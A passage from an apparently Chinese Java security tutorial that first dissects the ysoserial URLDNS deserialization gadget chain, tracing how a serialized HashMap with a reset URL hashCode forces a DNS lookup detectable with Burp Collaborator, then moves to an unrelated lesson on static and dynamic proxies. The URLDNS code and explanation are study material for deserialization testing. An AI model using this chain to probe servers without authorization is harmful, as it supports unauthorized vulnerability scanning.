             * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
             * using the serialized object.
             *
             * Potential false negative:
             * If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
             * second resolution.
             */
            static class SilentURLStreamHandler extends URLStreamHandler {
                    protected URLConnection openConnection(URL u) throws IOException {
                            return null;
                    }
                    protected synchronized InetAddress getHostAddress(URL u) {
                            return null;
                    }
            }
    }
一点点分析一下，首先从URL的创建开始：
    URLStreamHandler handler = new SilentURLStreamHandler();
                    HashMap ht = new HashMap(); // HashMap that will contain the URL
                    URL u = new URL(null, url, handler); // URL to use as the Key
                    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
  * 先是用`URLStreamHandler`c创建了一个句柄，这个句柄可以打开一个指定的url。
  * 创建一个哈希表，并将url对象u作为key存入到了哈希表中。
    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
                    return ht;
            }
            public static void main(final String[] args) throws Exception {
                    PayloadRunner.run(URLDNS.class, args);
            }
  * 这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到。
  * 返回了哈希表对象ht，并用PayloadRunner运行该利用链。
这段代码就干了这些事，那么是怎么触发反序列化的呢，我们之前提到过在反序列化时会触发readObject，那么我们直接去看Hashmap的readObject方法：
最重要的一行就是最后的`putValue`，里面计算了哈希表的键名。我们跟一下`putValue`方法，发现利用hash方法计算了哈希表的key。
我们再继续跟进hash方法，发现这里调用了哈希表key的hashcode方法，我们回到刚才创建哈希表时，是把url对象存入到了key中，所以我们直接去找`java.net.URL`的`hashCode`方法。
如果hashCode值不为-1，那么就会return，这个就是我们前面提到要将hashCode的值设置为-1的原因。
我们继续跟，handler此时是一个`URLStreamHandler`对象，继续跟进它的hashCode方法。
这里调用了getHostAddress方法，继续跟。
到这里可以看到`InetAddress.getByName(host)`的作用是根据主机名，获取其ip地址，在网络上就是一次DNS查询，我们可以通过burp的`Collaborator
client`来看到这次url请求。
# 代理模式
在Spirng中，AOP的底层实现就是代理模式，代理模式分为两种：
  * 静态代理
  * 动态代理
## 什么是代理？
我们用一个租房的例子来说明，按照正常的逻辑来讲，房东想要将自己的房子出租，并且此时有一个租客想租这个房子，那么租客就可以直接找到房东完成租房子这件事：
但是现在房东不想处理一些在租房过程中需要进行的繁琐步骤，比如打广告啊，和租客议价等等，所以这时候出现了一个新角色，叫做中介，那么此时房东所做的事只有出租自己的房子，其他事项全部交由中介来做，所以这个时候租客如果想租房子是不能直接找到房东的，必须在中间经由中介，中介来完成大部分事宜，并且在此时中介与房东共同完成租房这件事：  
## 静态代理
角色分析：
  * 抽象角色（租房这件事）：一般会使用抽象类或者接口来解决
  * 真实角色（房东）：被代理的角色
  * 代理角色（中介）：代理真实角色，代理真实角色后，我们一般会做一些附属操作
  * 客户（租客）：访问代理对象的人
代码实现：
租房 Rent接口：
    package com.y1zh3e7.demo01;
    public interface Rent {
        public void rent();
    }
房东 Host类：
    package com.y1zh3e7.demo01;
    public class Host implements Rent{
        public void rent()
        {
            System.out.println("房东要出租房子");
        }
    }
中介 Proxy类：
    package com.y1zh3e7.demo01;
    public class Proxy implements Rent{
        private Host host;
        public Proxy() {
        }
        public Proxy(Host host) {
            this.host = host;
        }
        public void rent(){
            host.rent();
            seeHouse();
            getFare();
        };
        public void seeHouse()
        {
            System.out.println("中介带你看房");
        }
        public void getFare()
        {
            System.out.println("中介收中介费了");
        }
    }
租客 Client类：
    package com.y1zh3e7.demo01;
    public class Client {
        public static void main(String[] args) {
            Host host = new Host();
            Proxy proxy = new Proxy(host);
        }
    }
可以发现房东只专注实现了租房这件事，而中介不仅帮房东实现了租房，而且自己也添加了格外的功能，比如看房收中介费等等。
代理模式的好处：
  * 可以时真是角色的目的更加纯粹，不用去关注一些公共的业务
  * 公共业务交给代理角色，实现了业务的分工
  * 公共业务发生扩展时，便于集中管理
缺点：
  * 一个真实角色就会产生一个代理角色，代码量翻倍，开发效率变低
## 动态代理
  * 动态代理和静态代理角色一样
  * 动态代理的代理类是自动生成的，不是我们直接写好的
  * 动态代理分为三大类：
    * 基于接口的动态代理——JDK的动态代理
    * 基于类的动态代理——cglib
    * java字节码实现——Javassist
动态代理需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序
整个动态代理大概流程如下：
  * Proxy.newProxyInstance 生成一个动态代理对象proxy，并且告诉这个proxy要代理哪个接口，这里注意此时必须要是接口才行，动态代理是无法代理一个类的，因此当动态代理接收到一个类时要转为该类所继承的接口。
  * 客户调用被代理对象的某一方法，此时java会将访问代理对象这个请求转发给动态代理对象proxy，并且在proxy的invoke中实现该方法
### 代码实现：
Rent接口 被代理对象和proxy对象共同实现的接口：
    package com.y1zh3e7.demo03;
    public interface Rent {
        public void rent();
    }
Host 被代理对象:
    package com.y1zh3e7.demo03;
    public class Host implements Rent {
        public void rent()
        {
            System.out.println("房东要出租房子");
        }
    }
动态代理工具类 ProxyInvocationHandler：
    package com.y1zh3e7.demo03;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    public class ProxyInvocationHandler implements InvocationHandler {
        private Rent rent;
            // 使用动态代理时通过setter传入要被代理的对象
        public void setRent(Rent rent) {
            this.rent = rent;
        }
            // 通过getProxy方法获得一个动态代理实例
        public Object getProxy()
        {
                // 通过Proxy.newProxyInstance初始化一个动态代理对象出来 三个参数基本上只有第二个是变化的，为被代理的接口，其他两个参数可以像这里一样写死
            return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this);
        }
        @Override
            // 当调用一个被代理对象的方法时，会在此处执行，invoke内可以自己构造如何执行该方法，从而达到了扩展方法功能的目的
            // 三个参数分别为 代理对象 代理对象被调用的方法 调用该方法的参数
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
           Object result =  method.invoke(rent,args);
            return result;
        }
    }
Client
    package com.y1zh3e7.demo03;
    public class Client {
        public static void main(String[] args) {
            Host host = new Host();
            ProxyInvocationHandler pih = new ProxyInvocationHandler();
            pih.setRent(host); // 将要代理的对象设置为host
            Rent proxy = (Rent) pih.getProxy(); // 拿到被代理接口的代理对象
            proxy.rent(); // 调用该方法后会将这个方法传给代理对象中的invoke方法来执行
        }
    }